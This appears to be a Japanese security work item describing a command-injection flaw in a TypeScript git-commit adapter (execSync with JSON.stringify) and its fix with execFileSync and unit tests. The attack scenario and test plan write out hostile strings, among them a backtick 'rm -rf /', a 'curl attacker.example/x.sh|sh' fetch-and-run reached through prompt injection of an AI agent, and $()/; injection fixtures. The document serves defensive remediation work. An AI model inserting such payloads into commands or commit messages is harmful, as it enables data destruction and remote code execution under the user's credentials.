---
id: WI-036
type: fix
severity: high
status: implemented
affects: [skill-quality]
---

# WI-036: skill-quality の git-commit-executor-adapter におけるコマンドインジェクション脆弱性 (HIGH)

> 起票日: 2026-05-07
> 起票経緯: WI-035 Phase 3 横展開監査の follow-up
> 関連: WI-035（同種パターンの先行修正例）

## 背景

WI-035 (`phase2-extensions` の git-log adapter) のコマンドインジェクション修正に伴って実施した横展開監査 (`grep "execSync(\`...${var}...\`)"` 全体走査) で、`scripts/harness/skill-quality/infrastructure/adapters/git-commit-executor-adapter.ts:14` に同種の sink を発見した。

### 該当箇所

`scripts/harness/skill-quality/infrastructure/adapters/git-commit-executor-adapter.ts:14`

```ts
async commit(commitMessage: CommitMessage): Promise<void> {
  const message = commitMessage.format();
  try {
    execSync(`git commit -m ${JSON.stringify(message)}`, { stdio: 'pipe' });
  ...
```

### 根本原因

- `execSync` は文字列引数を渡すと `/bin/sh -c` 経由で実行される
- `JSON.stringify` は **ダブルクオート・バックスラッシュ・制御文字** はエスケープするが、シェル評価対象である **バッククオート (`` ` ``) / `$` / `$()`** はエスケープしない
- 結果として `JSON.stringify("fix \`rm -rf /\` issue")` → `"\"fix \`rm -rf /\` issue\""` がそのまま `/bin/sh -c "git commit -m \"fix \`rm -rf /\` issue\""` に渡り、バッククオート部がコマンド置換として評価される
- 攻撃者制御値が `message` に流入すると任意コード実行

### `message` の流入経路

1. `CommitMessage.format()` が返す文字列は以下の合成: `feat({unit}/{storyId}): {description}\n\nWork-Item: {workItemId}`
2. `unit` / `storyId` / `description` は `CommitMessage.create()` で空文字バリデーションのみ。**シェルメタ文字バリデーションなし**
3. `workItemId` のみ `^WI-\d+$` パターンチェック済（安全）
4. `execute-tdd-cycle-usecase.ts` 経由で `description` が渡される。AI agent の TDD cycle 出力 / user 入力など、外部入力に由来する経路が成立し得る

### 攻撃シナリオ

1. 攻撃者制御値が `description` に到達するルート（例: AI agent prompt injection でコミットメッセージ生成時に `` `curl -sSf attacker.example/x.sh|sh` `` を含めさせる、ユーザが用意した story 文書の description を skill-quality が読んで commit する経路など）が成立
2. `JSON.stringify` を経由しても上記メタ文字は素通り
3. `/bin/sh -c` で評価され、phasegate を実行したユーザ権限で任意コード実行
4. （SSH 鍵 / npm token / git 認証情報の漏洩、CI ランナーへのピボット）

### 攻撃者側のコスト

- WI-035 ほど自明な「公開リポジトリ + ファイル名」攻撃ベクタではないが、AI agent 駆動のワークフロー (skill-quality の TDD cycle) で description が外部由来になる経路があれば成立
- 防御深層化 (defense in depth) としても execFileSync 化は妥当

## 本 WI でやること

### Phase 1: 修正実装（`quick-implementor` 推奨）

1. `git-commit-executor-adapter.ts:14` を `execFileSync` に置換:
   ```ts
   execFileSync('git', ['commit', '-m', message], { stdio: 'pipe' });
   ```
2. `JSON.stringify` は不要（配列引数は shell を介さないので無加工で安全）
3. `import { execSync }` → `import { execFileSync }` に変更

### Phase 2: テスト追加

1. **悪意ある description でも RCE が発生しないこと** を assert する unit test:
   - `description` に `` `echo PWNED` `` / `$(echo PWNED)` / `;echo PWNED` / `"` / `\n` 等を含む `CommitMessage` を fixture として用意
   - DI 経由で `execFileSync` をスタブし、引数配列が `['commit', '-m', <message>]` 形式で渡されることを assert
   - サブプロセス起動を伴わない unit test とする（実際の git は呼ばない）
2. 既存テストが新 signature で通ること

> 現状 `GitCommitExecutorAdapter` は DI seed なしで `execSync` を直接 import している。テスタビリティ向上のため、コンストラクタ引数で executor を注入できる形に変更する（WI-035 と同等の DI パターン）。

### Phase 3: 横展開監査（再走査）

1. 本 WI 修正後、再度 `execSync(\`...${var}...\`)` および `execSync\(.*\$\{` パターンを grep
2. WI-035 / WI-036 で網羅したか確認
3. 残存する場合は follow-up WI を起票

### Phase 4: リリース

1. minor バージョン bump（`0.114.0` → `0.115.0`）
2. CHANGELOG に **Security Fix** として明記（WI-035 への follow-up である旨を記載）
3. `npm publish --auth-type=web` で公開

## 受け入れ基準

- [ ] `git-commit-executor-adapter.ts` の `execSync` テンプレート文字列が `execFileSync` 配列引数形式に置換される
- [ ] `JSON.stringify` 呼び出しが削除される（配列引数化により不要）
- [ ] `GitCommitExecutorAdapter` のコンストラクタで executor を DI 可能になる（テスタビリティ）
- [ ] 悪意ある description（バッククオート / `$()` / `;` / `"` / 改行 含む）で RCE が発生しないことを assert する unit test が追加される
- [ ] 既存の skill-quality テストが全て通る
- [ ] 再走査で `execSync(\`...${var}...\`)` パターンが完全に消えていることを確認
- [ ] CHANGELOG に Security Fix として明記される
- [ ] minor version bump + npm publish 完了

## スコープ外

- L0 hook 経由のコマンドインジェクション監査（別 WI）
- `CommitMessage` value object 側でのシェルメタ文字バリデーション追加（fix そのものは `execFileSync` 化で十分。深層防御として別 WI で検討する案）
- GHSA 発行プロセスの整備（WI-035 と合わせて検討）

## 関連

- `scripts/harness/skill-quality/infrastructure/adapters/git-commit-executor-adapter.ts:10-31`
- `scripts/harness/skill-quality/domain/value-objects/commit-message.ts:33-39`（`format()` の出力組成）
- `scripts/harness/skill-quality/application/usecases/execute-tdd-cycle-usecase.ts:16`（`description` 流入点）
- `scripts/harness/skill-quality/composition-root.ts:64`（DI wiring。executor 注入対応のため修正対象）
- WI-035 (`docs/inception/_cross/WI-035/description.md`) — 同種修正の先例

## 参考

- Node.js docs: [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_processexecfilefile-args-options-callback)
- OWASP: [Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- WI-035 commit: `8f54193 [quick] fix: v0.114.0 — WI-035 phase2-extensions の git-log adapter のコマンドインジェクション (HIGH) を execFileSync 化で修正`
